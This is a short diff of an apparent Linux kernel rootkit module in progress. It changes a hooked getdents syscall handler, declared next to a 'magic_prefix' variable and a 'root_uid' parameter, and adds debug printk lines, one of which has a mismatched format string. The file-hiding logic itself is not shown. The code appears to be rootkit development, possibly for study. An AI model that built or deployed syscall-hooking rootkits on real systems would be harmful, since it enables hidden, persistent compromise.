@@ -56,8 +56,8 @@ MODULE_PARM_DESC(root_uid, "Root UID");
  */
 static char* magic_prefix;
 
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-  int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int count) {
+  int (*orig_func)(unsigned int fd, linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
 
   //Find the t_syscall_hook for __NR_getdents from our linked list
@@ -74,18 +74,18 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
 
   if (nread != 0) {
     int bpos = 0;
-    struct linux_dirent *d;
+    linux_dirent *d;
     int i = 0;
     while (i < 10 && bpos < nread) {
-      d = (struct linux_dirent *)(dirp + bpos);
-      printk(KERN_INFO "bpos: %d", bpos);
-      printk(KERN_INFO "ADDR: %10d", d);
+      d = (linux_dirent *)(dirp + bpos);
+      printk(KERN_INFO "dirp: %d, bpos: %d", bpos);
+      printk(KERN_INFO "ADDR: %d", d);
     // for (bpos = 0; bpos < nread;) {      
       printk(KERN_INFO "entry: %s\n", d->d_name);
       printk(KERN_INFO "%4d %s\n", d->d_reclen, d->d_name);
       // bpos += d->d_reclen;
       // printk(KERN_INFO "reclen: %d\n", d->d_reclen);
-      bpos += d->d_reclen;
+      bpos += (int)d->d_reclen;
       i++;
     }
   }
